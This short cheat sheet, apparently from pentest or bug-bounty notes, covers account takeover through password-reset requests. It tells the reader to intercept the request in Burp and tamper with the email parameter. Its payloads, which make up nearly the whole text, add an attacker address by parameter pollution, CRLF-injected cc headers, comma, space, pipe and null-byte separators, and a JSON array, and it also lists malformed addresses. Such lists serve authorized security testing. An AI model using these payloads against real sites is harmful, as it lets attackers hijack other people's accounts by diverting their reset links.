While requesting reset link intercept the request in burp and play with email parameter

    Double parameter (aka. HPP / HTTP parameter pollution):
    email=victim@xyz.tld&email=hacker@xyz.tld     &
    Carbon copy:
    email=victim@xyz.tld%0a%0dcc:hacker@xyz.tld    %0a%0dcc:
    Using separators:
    email=victim@xyz.tld,hacker@xyz.tld           , 
    email=victim@xyz.tld%20hacker@xyz.tld         %20
    email=victim@xyz.tld|hacker@xyz.tld           | and / and \
    email=victim@xyz.tld%00hacker@xyz.tld         %00
    No domain:
    email=victim
    No TLD (Top Level Domain):
    email=victim@xyz
    JSON table:
    {“email”:[“victim@xyz.tld”,”hacker@xyz.tld”]}
